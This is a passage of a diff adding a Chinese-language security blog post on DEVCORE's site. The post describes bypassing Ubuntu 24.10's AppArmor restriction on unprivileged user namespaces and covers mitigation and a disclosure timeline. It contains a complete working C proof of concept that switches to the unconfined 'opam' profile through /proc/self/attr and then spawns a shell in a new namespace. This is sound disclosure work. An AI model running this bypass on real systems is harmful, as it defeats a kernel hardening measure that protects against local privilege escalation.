+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">stack</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">new</span> <span class="o">=</span> <span class="n">fn_label_build_in_ns</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">profile</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span> <span class="c1">// [11]</span>
+                       <span class="n">aa_get_label</span><span class="p">(</span><span class="n">target</span><span class="p">),</span>
+                       <span class="n">aa_get_label</span><span class="p">(</span><span class="o">&amp;</span><span class="n">profile</span><span class="o">-&gt;</span><span class="n">label</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="c1">// [...]</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">AA_CHANGE_ONEXEC</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">error</span> <span class="o">=</span> <span class="n">aa_replace_current_label</span><span class="p">(</span><span class="n">new</span><span class="p">);</span> <span class="c1">// [12]</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">new</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">aa_put_label</span><span class="p">(</span><span class="n">new</span><span class="p">);</span>
+            <span class="n">new</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">aa_set_current_onexec</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">stack</span><span class="p">);</span> <span class="c1">// [13]</span>
+    <span class="p">}</span>
+
+    <span class="c1">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>簡而言之，若寫入的目標是 <code class="language-plaintext highlighter-rouge">/proc/self/attr/exec</code>，且內容為 <code class="language-plaintext highlighter-rouge">"exec &lt;設定檔名稱&gt;"</code>，那麼新的 AppArmor 設定檔會在程式執行 <code class="language-plaintext highlighter-rouge">SYS_execve</code> 系統呼叫後被套用。</p>
+
+<p>相反地，若是寫入 <code class="language-plaintext highlighter-rouge">/proc/self/attr/current</code> 並使用 <code class="language-plaintext highlighter-rouge">"changeprofile &lt;設定檔名稱&gt;"</code>，則該程式的設定檔會立即被更新。</p>
+
+<h2 id="4-out-of-the-sandbox">4. Out of the Sandbox</h2>
+
+<p>現在讓我們回過頭來看 <code class="language-plaintext highlighter-rouge">aa_profile_ns_perm()</code> 中的檢查邏輯。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">aa_label</span> <span class="o">*</span><span class="nf">aa_profile_ns_perm</span><span class="p">(</span><span class="k">struct</span> <span class="n">aa_profile</span> <span class="o">*</span><span class="n">profile</span> <span class="cm">/* ... */</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">profile_unconfined</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="c1">// [1]</span>
+        <span class="n">profile</span> <span class="o">==</span> <span class="n">profiles_ns</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">unconfined</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [2]</span>
+        <span class="c1">// [...]</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>第一個檢查是判斷目前的設定檔是否處於 unconfined 狀態 [1]。這個條件可以透過套用一個強制模式（Enforced mode）或回報模式（Complain mode）的設定檔來繞過。</p>
+
+<p>第二個檢查則是確認目前的設定檔是否就是系統預設的 <code class="language-plaintext highlighter-rouge">unconfined</code> 設定檔 [2]。因此，只要改用一個非預設的設定檔，這個檢查同樣也可以被繞過。</p>
+
+<p>總結來說，在目前這套機制下，只要套用任意一個處於 unconfined 狀態的 AppArmor 設定檔，就能繞過這些檢查，成功建立非特權使用者命名空間！</p>
+
+<h2 id="5-proof-of-concept">5. Proof-Of-Concept</h2>
+
+<p>要繞過 Ubuntu 的保護機制，就只需要把程式的 AppArmor 設定檔從預設的 <code class="language-plaintext highlighter-rouge">unconfined</code> 設定檔，換成其他任意一個處於 unconfined 狀態的設定檔即可。這邊我們選擇用 <code class="language-plaintext highlighter-rouge">opam</code> 這個設定檔，單純只是因為它操作單純、沒有額外的行為。設定檔的內容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># This profile allows everything and only exists to give the
+# application a name instead of having the label "unconfined"
+
+abi &lt;abi/4.0&gt;,
+include &lt;tunables/global&gt;
+
+profile opam /usr/bin/opam flags=(unconfined) {
+  userns,
+
+  # Site-specific additions and overrides. See local/README for details.
+  include if exists &lt;local/opam&gt;
+}
+</code></pre></div></div>
+
+<p>下方範例程式碼展示了兩種方法，成功在 Ubuntu 24.10 上建立非特權使用者命名空間。測試環境為 Ubuntu 24.10（核心版本 <code class="language-plaintext highlighter-rouge">6.11.0-14-generic</code>），測試日期為 2025 年 2 月 17 日。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
+#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">perror_exit</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">unshare_setup</span><span class="p">(</span><span class="n">uid_t</span> <span class="n">uid</span><span class="p">,</span> <span class="n">gid_t</span> <span class="n">gid</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">temp</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">edit</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_NEWNET</span> <span class="o">|</span> <span class="n">CLONE_NEWUSER</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"unshare"</span><span class="p">);</span>
+    
+    <span class="n">temp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/setgroups"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">temp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/setgroups"</span><span class="p">);</span>
+    
+    <span class="n">write</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="s">"deny"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"deny"</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
+    
+    <span class="n">temp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/uid_map"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">temp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/uid_map"</span><span class="p">);</span>
+    
+    <span class="n">snprintf</span><span class="p">(</span><span class="n">edit</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">edit</span><span class="p">),</span> <span class="s">"0 %d 1"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">edit</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">edit</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
+
+    <span class="n">temp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/gid_map"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">temp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/gid_map"</span><span class="p">);</span>
+    
+    <span class="n">snprintf</span><span class="p">(</span><span class="n">edit</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">edit</span><span class="p">),</span> <span class="s">"0 %d 1"</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">edit</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">edit</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">const</span> <span class="kt">char</span> <span class="n">profile1</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"exec opam"</span><span class="p">;</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="n">profile2</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"changeprofile opam"</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">func_1</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/attr/exec"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/attr/exec"</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">profile1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">profile1</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/usr/bin/unshare"</span><span class="p">,</span> <span class="s">"-r"</span><span class="p">,</span> <span class="s">"-n"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"/bin/bash"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">_envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/usr/bin/unshare"</span><span class="p">,</span> <span class="n">_argv</span><span class="p">,</span> <span class="n">_envp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">func_2</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/attr/current"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/attr/current"</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">profile2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">profile2</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="n">unshare_setup</span><span class="p">(</span><span class="n">getuid</span><span class="p">(),</span> <span class="n">getgid</span><span class="p">());</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">_envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="n">_argv</span><span class="p">,</span> <span class="n">_envp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">func_1</span><span class="p">();</span>
+    <span class="n">func_2</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="6-mitigation">6. Mitigation</h2>
+
+<p>這個繞過方法僅在 <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined</code> 被關閉（設為 0）時才會生效。而從 Ubuntu 25.04 開始，這個參數預設為啟用狀態，因此不受影響。</p>
+
+<p>針對 Ubuntu 24.10 及更早版本的使用者，可以參考<a href="https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes">官方說明文章</a>，瞭解如何防止任何非特權且處於 unconfined 狀態的程式執行 <code class="language-plaintext highlighter-rouge">aa-exec</code> 來切換 AppArmor 設定檔，以避免保護機制遭到繞過。</p>
+
+<h2 id="7-disclosure-timeline">7. Disclosure Timeline</h2>
+
+<ul>
+  <li>2025-02-16：研究員 @roddux 提到 AppArmor 的命名空間限制機制很容易被繞過。</li>
+  <li>2025-02-17：我發現一個繞過方式。</li>
+  <li>2025-02-24：我將此問題回報給 ZDI 團隊。</li>
+  <li>2025-03-21：研究員 @roddux 公開了他的繞過方法。</li>
+  <li>2025-03-27：Qualys 團隊在看到 @roddux 的公開貼文後，也發布了他們的漏洞通報。</li>
+  <li>2025-04-27：ZDI 回覆表示對此類型的漏洞不感興趣，並拒絕後續處理。</li>
+  <li>2025-04-30：我改為將此問題回報給 Ubuntu 安全團隊。</li>
+  <li>2025-05-01：維護者 John 通知我此問題已進入初步審查階段。</li>
+  <li>2025-05-30：John 回覆完整的問題分析與說明。</li>
+  <li>2025-06-26：協作發布文章。</li>
+</ul>
+
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+         <!-- 作者 -->
+        <section>
+            <div class="container article_footer">
+                <div class="author_info">
+                    <a href="/blog/author/pumpkin">
+                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/pumpkin.png);"></div>
+                    </a>
+                    <div>
+                        <a class="author" href="/blog/author/pumpkin">
+                            <h3>Pumpkin</h3>
+                        </a>
+                        <span>Security Researcher</span>
+                        <p>
+                            This is 🎃
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+
+        <!-- 相關文章 -->
+        <section class="recommand articles-list">
+            <div class="container">
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
+                    <div class="content">
+                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/Ubuntu/">#Ubuntu</a> <a href="/blog/tag/Advisory/">#Advisory</a> <a href="/blog/tag/Linux/">#Linux</a> <a href="/blog/tag/Kernel/">#Kernel</a> <a href="/blog/tag/AppArmor/">#AppArmor</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/">The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction</a> 
+                        </h2>
+                    
+                    
+                        <a class="author" href="/blog/author/pumpkin">
+                            <h3>Pumpkin</h3>
+                        </a>
+                    
+                        <span class="date">2025-06-26</span>
+                        <p class="line-litmit-3">近期 Ubuntu 實作了新的沙盒機制來減少攻擊面，然而其乍看之下堅不可摧，但經過研究後發現，繞過方式並沒有想像中那麼困難！本文將介紹我們如何從核心層級著手找出繞過方法，並分享研究過程中遇到的一些有趣故事。
+                        </p>
+                    </div>
+                </article>
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
+                    <div class="content">
+                        <a class="category" href="/blog/category/最新消息">最新消息</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/OffSec/">#OffSec</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/OSEE/">#OSEE</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/LiveTraining/">#LiveTraining</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/">EXP-401 (OSEE)：用五天課程訓練通透十年的知識體系</a> 
+                        </h2>
+                    
+                    
+                        <a class="author" href="/blog/author/terrynini">
+                            <h3>Terrynini</h3>
+                        </a>
+                    
+                        <span class="date">2025-05-22</span>
+                        <p class="line-litmit-3">EXP-401（OSEE），也叫做 Advanced Windows Exploitation（AWE），是 OffSec 中唯一的「Expert」等級課程，也是公認最困難、通過率最低的證照
+                        </p>
+                    </div>
+                </article>
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
+                    <div class="content">
+                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/DEVCORE CONF/">#DEVCORE CONF</a> <a href="/blog/tag/Red Team/">#Red Team</a> <a href="/blog/tag/Active Directory/">#Active Directory</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2025/04/10/taking-over-the-entire-domain-in-minutes-what-have-you-overlooked-in-active-directory/">關於分分鐘拿下整個網域，你還疏忽了什麼？</a> 
+                        </h2>
+                    
+                    
+                        <a class="author" href="/blog/author/xy">
+                            <h3>XY</h3>
+                        </a>
+                    
+                        <span class="date">2025-04-10</span>
+                        <p class="line-litmit-3">本文分享我們在實戰上遇到 AD CS 的經驗以及特別的案例，並介紹 AD CS 的基本概念，希望讓企業與對 Active Directory 安全有興趣的讀者了解其重要性和潛在的風險。
+                        </p>
+                    </div>
+                </article>
+              
+
+            </div>
+        </section>
+    </div>
+
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">服務</h6>
+        <ul>
+            <li><a href="/services/red-team/">紅隊演練</a></li>
+            <li><a href="/services/penetration-test/">滲透測試</a></li>
+            <li><a href="/services/security-consulting/">資安顧問服務</a></li>
+            <li><a href="/services/security-training/">資安教育訓練</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">研究</h6>
+        <ul>
+            <li><a href="/research/overview/">總覽概要</a></li>
+            <li><a href="/research/awards/">競賽與獎項</a></li>
+            <li><a href="/research/bug-bounty/">企業漏洞回報</a></li>
+            <li><a href="/research/talks/">國際研討會</a></li>
+            <li><a href="/research/cve/">CVE 漏洞列表</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">公司</h6>
+        <ul>
+            <li><a href="/company/about/">公司簡介</a></li>
+            <li><a href="/company/our-team/">團隊成員</a></li>
+            <li><a href="/company/history/">成就與沿革</a></li>
+            <li><a href="/company/csr/">企業社會責任</a></li>
+            <li><a href="/company/jobs/">工作機會</a></li>
+            <li><a href="/contact/">聯絡我們</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">新聞</h6>
+        <ul>
+            <li><a href="/blog/">BLOG</a></li>
+            <li><a href="/media-kit/">媒體素材下載</a></li>
+        </ul>
+    </div>
+
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
+
+    <div class="copyright">
+        <div class="info">
+            <span>© 2025 DEVCORE 戴夫寇爾股份有限公司. <b class="line-block">All rights reserved.</b></span>
+            <span><a href="/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
+
+</div>
+    </footer>
+</body>
+</html>
+
